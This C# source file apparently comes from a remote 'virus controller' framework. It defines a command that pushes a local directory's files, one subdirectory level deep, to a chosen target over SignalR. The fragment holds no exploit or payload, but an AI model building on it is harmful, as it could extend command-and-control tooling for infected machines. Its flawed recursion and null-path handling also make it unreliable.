using Microsoft.AspNetCore.SignalR.Client;
using System;
using System.IO;
using System.Threading.Tasks;
using VirusControllerLibrary.Extensions;

namespace VirusControllerLibrary
{
    public class SendDirectoryCommand : SendFileCommand, IHaveOneTargetCommand
    {
        public string DirectoryPath { get; private set; }
        public SendDirectoryCommand(string targetId, string directoryPath, string targetDirectoryPath = null) : base(targetId, targetDirectoryPath)
        {
            if (File.Exists(directoryPath) || Directory.Exists(directoryPath))
            {
                DirectoryPath = directoryPath;
            }
            else
            {
                Console.WriteLine($"file with path {directoryPath} do not exists");
                Console.WriteLine($"command won't be created");
            }
        }

        public override async Task ExecuteAsync()
        {
            var files = new DirectoryInfo(DirectoryPath).GetFiles();
            var directories = new DirectoryInfo(DirectoryPath).GetDirectories();

            SetHubConnection(_hubConnection);

            await base.ExecuteAsync(files);

            foreach (var directory in directories)
                await base.ExecuteAsync(directory.GetFiles());
        }
    }
}
